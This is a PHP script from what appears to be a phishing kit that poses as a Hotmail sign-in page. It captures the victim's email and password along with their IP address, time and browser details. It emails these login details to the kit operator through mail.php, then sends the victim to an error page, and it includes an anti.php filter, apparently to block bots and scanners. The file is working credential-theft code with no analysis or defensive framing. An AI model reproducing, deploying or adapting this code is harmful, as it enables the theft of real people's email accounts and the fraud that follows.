<?php
error_reporting(0);
include '../anti.php';
session_start();


$v_ip = $_SERVER['REMOTE_ADDR'];
$hash = md5($v_ip);

if(!empty($_SESSION['email']))  {

$username = $_SESSION['email'];
 
}

if(!empty($_POST['password']))  {

$pass = $_POST['password'];
$_SESSION['password'] = $_POST['password'];
date_default_timezone_set('Europe/Amsterdam');
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");
$agent = $_SERVER['HTTP_USER_AGENT'];
include "../mail.php";

$msg .= "+ ------------------------------------------+\n";
$msg .= "| hotmail Login Details\n";
$msg .= "+ ------------------------------------------+\n";
$msg .= "| Username: ".$username."\n";
$msg .= "| Password: ".$pass."\n";
$footer = "+ ------------------------------------------+\n";
$footer .= "+ Sent from $ip on $time via $agent\n";
$footer .= "+ ------------------------------------------+\n\n";

$data = $msg . $footer;

$_SESSION['emailr'] = $msg;

$subject = "hotmail Login Info for $username";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/plain; charset=utf-8\r\n";
@mail($to, $subject, $msg, $headers);
 

 sleep(1);
header("location: error.php");  
}

?>
